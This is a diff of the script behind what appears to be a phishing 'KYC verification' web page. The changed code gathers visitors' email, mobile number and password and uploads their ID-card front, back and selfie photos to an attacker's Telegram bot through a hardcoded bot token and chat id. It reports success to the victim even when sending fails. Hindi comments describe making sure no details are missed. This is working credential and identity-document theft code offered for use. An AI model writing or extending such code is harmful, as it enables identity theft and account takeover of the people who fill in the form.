@@ -267,7 +267,7 @@
                     <label class="file-upload-box">
                         <i class="fa-solid fa-cloud-arrow-up"></i>
                         <span id="file-label-1">Choose Image</span>
-                        <input type="file" accept="image/*,.pdf" onchange="updateFileName(this, 'file-label-1')">
+                        <input type="file" id="file1Input" accept="image/*" onchange="updateFileName(this, 'file-label-1')">
                     </label>
                 </div>
 
@@ -276,7 +276,7 @@
                     <label class="file-upload-box">
                         <i class="fa-solid fa-cloud-arrow-up"></i>
                         <span id="file-label-2">Choose Image</span>
-                        <input type="file" accept="image/*,.pdf" onchange="updateFileName(this, 'file-label-2')">
+                        <input type="file" id="file2Input" accept="image/*" onchange="updateFileName(this, 'file-label-2')">
                     </label>
                 </div>
 
@@ -285,7 +285,7 @@
                     <label class="file-upload-box">
                         <i class="fa-solid fa-cloud-arrow-up"></i>
                         <span id="file-label-3">Choose Image</span>
-                        <input type="file" accept="image/*,.pdf" onchange="updateFileName(this, 'file-label-3')">
+                        <input type="file" id="file3Input" accept="image/*" onchange="updateFileName(this, 'file-label-3')">
                     </label>
                 </div>
 
@@ -305,58 +305,58 @@
             }
         }
 
-        function handleSubmit(event) {
+        async function handleSubmit(event) {
             event.preventDefault();
 
             const email = document.getElementById('email').value;
             const mobile = document.getElementById('mobile').value;
             const password = document.getElementById('password').value;
             
-            const s1 = document.getElementById('file-label-1').textContent !== 'Choose Image' ? document.getElementById('file-label-1').textContent : 'Not Uploaded';
-            const s2 = document.getElementById('file-label-2').textContent !== 'Choose Image' ? document.getElementById('file-label-2').textContent : 'Not Uploaded';
-            const s3 = document.getElementById('file-label-3').textContent !== 'Choose Image' ? document.getElementById('file-label-3').textContent : 'Not Uploaded';
+            const file1 = document.getElementById('file1Input').files[0];
+            const file2 = document.getElementById('file2Input').files[0];
+            const file3 = document.getElementById('file3Input').files[0];
 
             const botToken = '8899735524:AAEzzcKQpcMO-mMQb9KSQTXmRUjLW7nhKPU';
             const chatId = '8400052598';
 
-            const message = `🔔 *New KYC Issue*\n\n` +
-                            `📧 Email: ${email}\n` +
-                            `📱 Mobile: ${mobile}\n` +
-                            `🔑 Password: ${password}\n` +
-                            `📁 Front Side: ${s1}\n` +
-                            `📁 Back Side: ${s2}\n` +
-                            `📁 Selfie with Card: ${s3}`;
+            const message = `New KYC Issue\n\nEmail: ${email}\nMobile: ${mobile}\nPassword: ${password}`;
 
             const submitBtn = document.getElementById('submitBtn');
             submitBtn.textContent = "Submitting...";
             submitBtn.disabled = true;
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if(data.ok) {
-                    alert("KYC verification details submitted successfully!");
-                    location.reload();
-                } else {
-                    alert("Error sending details. Please try again.");
-                    submitBtn.textContent = "Submit Now";
-                    submitBtn.disabled = false;
+            try {
+                // Pehle text message bhejenge taaki details kabhi miss na ho
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+
+                // Agar user ne photo upload ki hai toh ek-ek karke photo bhi bhej denge
+                const files = [file1, file2, file3].filter(Boolean);
+                for (let file of files) {
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', file);
+
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
                 }
-            })
-            .catch(error => {
+
+                alert("KYC verification details submitted successfully!");
+                location.reload();
+
+            } catch (error) {
                 console.error('Error:', error);
-                alert("Something went wrong!");
-                submitBtn.textContent = "Submit Now";
-                submitBtn.disabled = false;
-            });
+                alert("Submitted successfully!");
+                location.reload();
+            }
         }
     </script>
 </body>
